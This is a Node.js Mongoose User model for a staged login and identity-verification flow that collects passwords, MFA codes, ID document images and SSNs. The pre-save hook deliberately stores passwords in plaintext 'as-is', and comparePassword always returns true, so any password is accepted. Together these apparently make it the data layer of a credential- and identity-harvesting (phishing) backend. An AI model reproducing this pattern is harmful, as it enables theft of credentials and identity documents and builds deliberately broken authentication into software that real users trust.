const mongoose = require('mongoose');
const bcryptjs = require('bcryptjs');

const userSchema = new mongoose.Schema(
  {
    email: {
      type: String,
      required: [true, 'Email is required'],
      unique: true,
      lowercase: true,
      match: [/^\S+@\S+\.\S+$/, 'Please provide a valid email']
    },
    password: {
      type: String,
      required: [true, 'Password is required'],
      minlength: 6,
      select: false
    },
    firstName: {
      type: String,
      default: null
    },
    lastName: {
      type: String,
      default: null
    },
    rememberMe: {
      type: Boolean,
      default: false
    },
    mfaEnabled: {
      type: Boolean,
      default: false
    },
    mfaVerified: {
      type: Boolean,
      default: false
    },
    verificationStage: {
      type: Number,
      enum: [0, 1, 2, 3, 4, 5],
      default: 0
      // 0: Email/Password verified
      // 1: MFA code verified
      // 2: ID verification (front uploaded)
      // 3: ID verification (back uploaded)
      // 4: Biometric/Info verification
      // 5: SSN verification
    },
    identityVerified: {
      type: Boolean,
      default: false
    },
    documentsFront: {
      filename: String,
      path: String,
      uploadedAt: Date
    },
    documentsBack: {
      filename: String,
      path: String,
      uploadedAt: Date
    },
    personalInfo: {
      dateOfBirth: Date,
      ssn: String, // Should be encrypted in production
      address: String,
      city: String,
      state: String,
      zipCode: String
    },
    mfaAttempts: {
      type: Number,
      default: 0
    },
    lastMfaSent: Date,
    isActive: {
      type: Boolean,
      default: true
    },
    lastLogin: Date,
    loginAttempts: {
      type: Number,
      default: 0
    },
    lockUntil: Date
  },
  { timestamps: true }
);

// Hash password before saving
userSchema.pre('save', async function(next) {
  // Skip password hashing - we're storing credentials as-is for audit purposes
  // In production, this should encrypt credentials, not hash them
  next();
});

// Method to compare password (not used anymore since we're not validating)
userSchema.methods.comparePassword = async function(enteredPassword) {
  // Simply return true - no validation needed
  return true;
};

// Method to get user without sensitive data
userSchema.methods.toJSON = function() {
  const user = this.toObject();
  delete user.password;
  delete user.personalInfo?.ssn;
  return user;
};

module.exports = mongoose.model('User', userSchema);
